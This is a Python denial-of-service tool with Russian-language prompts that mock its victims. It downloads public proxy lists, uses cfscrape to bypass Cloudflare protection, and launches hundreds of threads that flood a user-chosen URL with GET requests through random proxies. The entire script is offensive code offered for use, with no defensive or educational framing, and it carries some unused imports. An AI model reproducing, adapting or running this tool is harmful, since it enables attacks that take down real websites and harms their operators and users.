# HTTP-BYPASS
import urllib2
import sys
import re
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'
##############
import cfscrape
import os
import random
import time
import requests
import threading
from colorama import Fore
os.system("clear")
print("""\033[93m
       __      ANONYMOUS       _____
      / /  __ _ _   _  ___ _  |___  |
     / /  / _` | | | |/ _ \ '__| / /
    / /__| (_| | |_| |  __/ |   / /
    \____/\__,_|\__, |\___|_|  /_/
                |___/
      ADDED NEW METHOD AND BYPASS 
         Разнеси всех и вся 💥
""")

def opth():
	for a in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Атак " + str(a+1) + " Запущено ")
	print(Fore.RED + " Подождите несколько секунд ...")
	time.sleep(7)
	input(Fore.CYAN + " Нажмите Enter начать атаку !")
	global oo
	oo = True

oo = False
def main():
	global url
	global list
	global pprr
	global thr
	global per
	url = str(input(Fore.GREEN + " Ваша Цель [Ссылка] : => " + Fore.WHITE))
	ssl = str(input(Fore.GREEN + " Включить SSL Мод? ? [y/n] : => " + Fore.WHITE))
	ge = str(input(Fore.GREEN + " Получить новый список прокси ? [y/n] : => " + Fore.WHITE))
	if ge =='y':
		if ssl == 'y':
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=yes&timeout=2000') #Code By GogoZin
			with open('proxies.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + " Получены прокси, ддось лохов :) !")
		else:
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=all&timeout=1000') #Code By GogoZin
			with open('proxies.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + " Получены прокси, ддось лохов :) !")
	else:
		pass
	list = str(input(Fore.GREEN + " Документ [proxies.txt] : => " + Fore.WHITE))
	pprr = open(list).readlines()
	print(Fore.GREEN + "Количество прокси : " + Fore.WHITE + "%d" %len(pprr))
	thr = int(input(Fore.GREEN + "Атак [Лучше-800] : => " + Fore.WHITE))
	per = int(input(Fore.GREEN + "Нагрузка [1-400] : => " + Fore.WHITE))
	opth()

def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = cfscrape.create_scraper()
	s.proxies = {}
	s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
	s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
	time.sleep(5)
	while True:
		while oo:
			try:
				s.get(url)
				print(Fore.CYAN + "Взлом жопы -> " + Fore.WHITE + str(url)+ Fore.CYAN + " From~# " +Fore.WHITE+ str(proxy[0])+":"+str(proxy[1]))
				try:
					for g in range(per):
						s.get(url)
						print(Fore.CYAN + "Взлом жопы -> " + Fore.WHITE + str(url)+Fore.CYAN + " From~# " +Fore.WHITE + str(proxy[0])+":"+str(proxy[1])) #code By GogoZin
					s.close()
				except:
					s.close()
			except:
				s.close()
				print(Fore.RED + "Сайт упал, защита дерьмо( !")


if __name__ == "__main__":
	main()
